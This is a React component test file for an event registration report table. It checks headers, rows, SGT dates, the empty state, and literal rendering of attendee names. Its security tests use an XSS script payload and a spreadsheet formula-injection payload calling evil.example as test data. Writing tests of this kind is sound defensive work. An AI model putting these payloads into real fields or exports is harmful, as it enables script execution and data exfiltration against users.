/*
 * Story: SPM-63 View Registration Information (Organiser and Coordinator), report table.
 * ACs: AC3 (names, emails, registration dates), AC4 (empty state).
 * Test cases: VIEW-REG-INFO-03-A (FE), 04-C (FE empty state), EVENT-REG-03-SEC-1 (coordinator report add-on).
 *
 * Component test: rows in, cells out. Oracles are literals from the Confluence cases and the prompt's resolved specs.
 */
import { render, screen, within } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { ReportTable } from "./ReportTable";
import { ALICE_TAN, CHLOE_NG, DEV_PATEL } from "./report.fixtures";

describe("SPM-63 AC3: the table shows each attendee's details", () => {
  // Oracle (SPEC 03-A): headers Name, Email, Contact Number, Registration Date, Status; three rows in the given (date)
  // order with SGT dates "27 Sep 2026 15:00 SGT", "28 Sep 2026 10:30 SGT", "29 Sep 2026 09:00 SGT" and status Confirmed.
  // Kills: dates in UTC (07:00); SGT suffix missing; two fields swapped; header label drift (Contact / Registered Date);
  //        rows re-sorted on the client.
  it("VIEW-REG-INFO-03-A: five columns and three exact rows", () => {
    // Arrange / Act
    render(<ReportTable registrations={[DEV_PATEL, ALICE_TAN, CHLOE_NG]} />);

    // Assert: column headers in order
    const headers = screen.getAllByRole("columnheader").map((h) => h.textContent);
    expect(headers).toEqual(["Name", "Email", "Contact Number", "Registration Date", "Status"]);
    // Assert: exactly three body rows with the literal cells
    const bodyRows = screen.getAllByRole("row").slice(1);
    const cells = bodyRows.map((row) => within(row).getAllByRole("cell").map((c) => c.textContent));
    expect(cells).toEqual([
      ["Dev Patel", "dev.patel@example.com", "87654321", "27 Sep 2026 15:00 SGT", "Confirmed"],
      ["Alice Tan", "alice.tan@example.com", "98765432", "28 Sep 2026 10:30 SGT", "Confirmed"],
      ["Chloe Ng", "chloe.ng@example.com", "91234567", "29 Sep 2026 09:00 SGT", "Confirmed"],
    ]);
  });

  // Oracle (derived from SPM-61: contact number optional): a missing contact number is an empty cell, not "null".
  // Kills: "undefined" or "null" printed.
  it("VIEW-REG-INFO-03-A-NULL: an empty contact number leaves an empty cell", () => {
    // Arrange / Act
    render(<ReportTable registrations={[{ ...DEV_PATEL, contactNumber: "" }]} />);

    // Assert
    const cells = within(screen.getAllByRole("row")[1]).getAllByRole("cell").map((c) => c.textContent);
    expect(cells[2]).toBe("");
  });
});

describe("SPM-63 AC4: an event with no registrations", () => {
  // Oracle (SPEC 04-C): the empty state reads exactly "No registrations yet" and there is no data table.
  // Kills: a blank page; an empty table shown instead of the message.
  it("VIEW-REG-INFO-04-C: shows the empty state", () => {
    // Arrange / Act
    render(<ReportTable registrations={[]} />);

    // Assert
    expect(screen.getByText("No registrations yet")).toBeInTheDocument();
    expect(screen.queryByRole("table")).not.toBeInTheDocument();
  });
});

describe("SPM-63 AC3: attendee-supplied text is shown as text", () => {
  // Oracle (EVENT-REG-03-SEC-1, coordinator report): a registration named <script>alert(1)</script> is rendered as
  // literal text: the same characters are visible and no script element exists.
  // Kills: dangerouslySetInnerHTML or any HTML interpretation of a name.
  it("EVENT-REG-03-SEC-1 (coordinator report): a script payload renders as literal text", () => {
    // Arrange
    const payload = "<script>alert(1)</script>";

    // Act
    const { container } = render(<ReportTable registrations={[{ ...DEV_PATEL, fullName: payload }]} />);

    // Assert
    expect(screen.getByText(payload)).toBeInTheDocument();
    expect(container.querySelector("script")).toBeNull();
  });

  // Oracle (SPM-61 03-SEC-1 / R10): a formula payload is shown literally on screen (neutralisation is export-only).
  // Kills: neutralisation applied to the screen (a leading ' would show).
  it("VIEW-REG-INFO-04-E: a formula payload is shown unchanged on screen", () => {
    // Arrange
    const payload = '=IMPORTXML("http://evil.example/x","//a")';

    // Act
    render(<ReportTable registrations={[{ ...DEV_PATEL, fullName: payload }]} />);

    // Assert
    expect(screen.getByText(payload)).toBeInTheDocument();
  });
});

// ASSUMPTION index
// (none: every oracle is SPEC or derived)
